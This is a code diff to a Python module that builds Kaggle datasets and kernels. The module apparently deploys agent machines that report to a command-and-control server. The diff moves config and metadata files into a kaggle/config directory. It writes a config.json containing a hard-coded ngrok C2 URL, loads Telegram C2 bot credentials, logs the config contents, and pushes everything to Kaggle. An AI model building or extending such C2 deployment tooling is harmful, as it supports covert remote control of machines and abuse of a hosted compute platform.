@@ -79,10 +79,6 @@ def create_dataset_and_kernel(
             "licenses": [{"name": "MIT"}],
         }
         
-        # Write dataset metadata
-        with open(project_root / "dataset-metadata.json", "w") as f:
-            json.dump(dataset_meta, f, indent=2)
-        
         # Get Telegram C2 config
         telegram_bot_token = None
         telegram_chat_id = None
@@ -238,9 +234,9 @@ def create_dataset_with_machines(
         
         # Get current C2 URL from config or use default
         file_path = Path(__file__).resolve()
-        # datasets.py -> kaggle -> agents -> src -> project_root
-        project_root = file_path.parent.parent.parent.parent
-        config_path = project_root / "config.json"
+        # Config is in kaggle/config/config.json (same level as datasets.py)
+        kaggle_dir = file_path.parent
+        config_path = kaggle_dir / "config" / "config.json"
         
         # Load or create config
         c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
@@ -302,25 +298,24 @@ def create_dataset_with_machines(
             "data": [],
         }
         
-        # Create dataset directory in project
-        # Use src/ directory to avoid uploading venv, .git, etc.
-        # datasets.py -> kaggle -> agents -> src
-        src_dir = file_path.parent.parent.parent
-        dataset_dir = src_dir
+        # Create dataset directory - use kaggle/config/ for config files
+        # This directory will be uploaded to Kaggle
+        kaggle_config_dir = kaggle_dir / "config"
+        dataset_dir = kaggle_config_dir  # Upload config dir as dataset
         
         # Dataset files are already in project (src, setup.py, requirements.txt, README.md)
         log_fn(f"[DATASET] Using project files from: {dataset_dir}")
         
-        # Write dataset metadata
-        with open(dataset_dir / "dataset-metadata.json", "w") as f:
-            json.dump(dataset_meta, f, indent=2)
-        
-        # Write config.json to dataset (auto-updated with current C2 URL)
-        with open(dataset_dir / "config.json", "w") as f:
+        # Write config.json to kaggle/config/ (will be uploaded to dataset)
+        with open(kaggle_config_dir / "config.json", "w") as f:
             json.dump(config_data, f, indent=2)
         
-        log_fn(f"[DATASET] Dataset metadata written")
+        # Write dataset-metadata.json (required by Kaggle CLI)
+        with open(kaggle_config_dir / "dataset-metadata.json", "w") as f:
+            json.dump(dataset_meta, f, indent=2)
+        
         log_fn(f"[DATASET] config.json written with C2: {c2_url}")
+        log_fn(f"[DATASET] config.json content: {json.dumps(config_data, indent=2)[:500]}")
         
         # Push dataset to Kaggle
         kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
